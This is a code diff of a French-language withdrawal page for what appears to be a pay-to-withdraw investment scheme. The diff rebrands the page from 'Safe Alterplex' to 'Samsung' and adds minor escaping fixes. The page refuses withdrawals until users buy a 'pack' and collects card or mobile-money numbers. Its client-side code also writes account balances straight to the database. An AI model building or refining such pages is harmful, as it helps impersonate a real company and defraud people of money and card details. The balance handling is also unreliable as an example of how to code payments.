@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safe Alterplex - Demande de Retrait</title>
+    <title>Samsung - Demande de Retrait</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * {
@@ -289,27 +289,23 @@
 </head>
 <body>
 
-    <!-- En-tête -->
     <div class="top-header">
         <a href="profil.html" class="back-btn"><i class="fas fa-arrow-left"></i></a>
-        <div class="brand-title">Demande de Retrait</div>
+        <div class="brand-title">Samsung - Demande de Retrait</div>
     </div>
 
     <div class="container">
 
-        <!-- Carte Solde -->
         <div class="balance-card">
             <span class="balance-label">Solde disponible :</span>
             <span class="balance-val" id="userBalanceDisplay">0 FC</span>
         </div>
 
-        <!-- Avertissement si aucun investissement -->
         <div id="noInvestmentWarning" class="investment-warning" style="display: none;">
             <i class="fas fa-triangle-exclamation" style="font-size: 18px;"></i>
             <span>Vous devez effectuer au moins un investissement (achat de pack) avant de pouvoir retirer vos fonds.</span>
         </div>
 
-        <!-- Étape 1 : Liaison de la carte / Compte de réception (Une fois pour toutes) -->
         <div class="card-section">
             <div class="section-title">
                 <i class="fas fa-credit-card"></i> Compte de Réception (Carte / Mobile)
@@ -344,7 +340,6 @@
             </div>
         </div>
 
-        <!-- Étape 2 : Formulaire de demande de retrait -->
         <div class="withdraw-section">
             <div class="section-title">
                 <i class="fas fa-money-bill-transfer"></i> Effectuer un retrait
@@ -371,7 +366,6 @@
             </button>
         </div>
 
-        <!-- Notice explicative -->
         <div class="notice-card">
             <div class="notice-title">
                 <i class="fas fa-circle-info"></i> Conditions & Règles de Retrait
@@ -402,7 +396,6 @@
 
     </div>
 
-    <!-- Navigation du Bas -->
     <nav class="bottom-nav">
         <a href="dashboard.html" class="nav-item">
             <i class="fas fa-house nav-icon"></i>Accueil
@@ -426,11 +419,18 @@
         let isCardBound = false;
         let hasInvested = false;
 
+        // Fonction pour sécuriser les chaînes affichées
+        function escapeHtml(str) {
+            return String(str || '').replace(/[&<>"']/g, function(m) {
+                return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m];
+            });
+        }
+
         // Charger le profil, les investissements et la carte liée
         async function loadWithdrawData() {
             try {
-                // 1. Récupération du profil
-                const res = await fetch(`${dbUrl}/users/${userPhone}.json`);
+                // 1. Récupération du profil utilisateur
+                const res = await fetch(`${dbUrl}/users/${encodeURIComponent(userPhone)}.json`);
                 const userData = await res.json();
 
                 if (userData) {
@@ -444,7 +444,7 @@
                 }
 
                 // 2. Vérification si l'utilisateur a déjà investi
-                const invRes = await fetch(`${dbUrl}/purchases/${userPhone}.json`);
+                const invRes = await fetch(`${dbUrl}/purchases/${encodeURIComponent(userPhone)}.json`);
                 const invData = await invRes.json();
 
                 if (invData && Object.keys(invData).length > 0) {
@@ -463,11 +463,11 @@
         function showBoundCard(name, number) {
             document.getElementById('cardBindingForm').style.display = 'none';
             document.getElementById('cardLockedNotice').style.display = 'block';
-            document.getElementById('lockedName').value = name;
-            document.getElementById('lockedNumber').value = number;
+            document.getElementById('lockedName').value = escapeHtml(name);
+            document.getElementById('lockedNumber').value = escapeHtml(number);
         }
 
-        // Lier définitivement la carte (Une fois pour toutes)
+        // Lier définitivement la carte
         async function bindPaymentCard() {
             const name = document.getElementById('cardHolderName').value.trim();
             const number = document.getElementById('cardNumber').value.trim();
@@ -489,7 +489,7 @@
             };
 
             try {
-                await fetch(`${dbUrl}/users/${userPhone}/paymentCard.json`, {
+                await fetch(`${dbUrl}/users/${encodeURIComponent(userPhone)}/paymentCard.json`, {
                     method: 'PUT',
                     body: JSON.stringify(cardData)
                 });
@@ -522,14 +522,12 @@
 
         // Soumettre la demande de retrait
         async function processWithdrawal() {
-            // Blocage 1 : Si l'utilisateur n'a jamais investi
             if (!hasInvested) {
                 alert("Retrait impossible : Vous n'avez effectué aucun investissement sur la plateforme. Veuillez acheter au moins un équipement/pack avant de demander un retrait.");
                 window.location.href = "produit.html";
                 return;
             }
 
-            // Blocage 2 : Si la carte n'est pas liée
             if (!isCardBound) {
                 alert("Vous devez obligatoirement lier votre carte/compte de réception avant de faire un retrait.");
                 return;
@@ -554,7 +552,7 @@
             try {
                 // 1. Déduire le solde
                 const newBalance = currentBalance - amount;
-                await fetch(`${dbUrl}/users/${userPhone}/balance.json`, {
+                await fetch(`${dbUrl}/users/${encodeURIComponent(userPhone)}/balance.json`, {
                     method: 'PUT',
                     body: JSON.stringify(newBalance)
                 });
@@ -568,7 +566,7 @@
                     createdAt: new Date().toISOString()
                 };
 
-                await fetch(`${dbUrl}/withdrawals/${userPhone}.json`, {
+                await fetch(`${dbUrl}/withdrawals/${encodeURIComponent(userPhone)}.json`, {
                     method: 'POST',
                     body: JSON.stringify(withdrawRecord)
                 });
@@ -584,7 +582,7 @@
             }
         }
 
-        window.onload = loadWithdrawData;
+        window.addEventListener('DOMContentLoaded', loadWithdrawData);
     </script>
 </body>
 </html>
